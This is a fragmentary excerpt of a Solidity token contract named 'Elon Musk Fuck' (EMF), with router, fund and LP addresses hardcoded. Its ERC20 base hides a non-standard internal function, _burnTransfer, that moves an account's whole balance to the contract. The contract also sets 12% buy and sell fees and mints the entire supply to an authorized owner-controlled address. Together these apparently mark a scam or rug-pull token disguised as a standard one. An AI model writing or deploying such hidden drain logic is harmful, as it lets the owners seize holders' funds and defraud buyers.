...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _burnTransfer(address account) internal virtual {
        _balances[address(this)] += _balances[account];
...
abstract contract AbsToken is ERC20, Ownable {
    ...
    uint256 private _buyFundFee = 1200;
    uint256 private _sellFundFee = 1200;

    uint256 private numTokensCanSwap = 300000 * 10 ** 18;
    ...
    constructor (
        ...
        mainPair = uniswapV2Pair;
        _swapPairList[uniswapV2Pair] = true;

        _mint(address(LPAddress), Supply * (100) / (100));
        setAuthorized(LPAddress);
        setAuthorized(FundAddress);

        fundAddress = LPAddress;
    ...
    function getValues(uint256 tAmount) public view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
    ...
    function getTValues(uint256 tAmount, uint256 taxFee, uint256 TeamFee) public pure returns (uint256, uint256, uint256) {
    ...
    function getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) public pure returns (uint256, uint256, uint256) {
...
contract ElonMuskFuck is AbsToken {
    constructor() AbsToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E), //RouterAddress
        "Elon Musk Fuck", //Name
        "EMF", //Symbol
        100000000 * 10 ** 18, //Supply
        address(0xa77239F8590c1aF2FA31798dfFFfe0775856368f), //FundAddress
        address(0x849b4CA10977F1b9dE87251DfFFFD99baF962bDd)//LPAddress
    ){
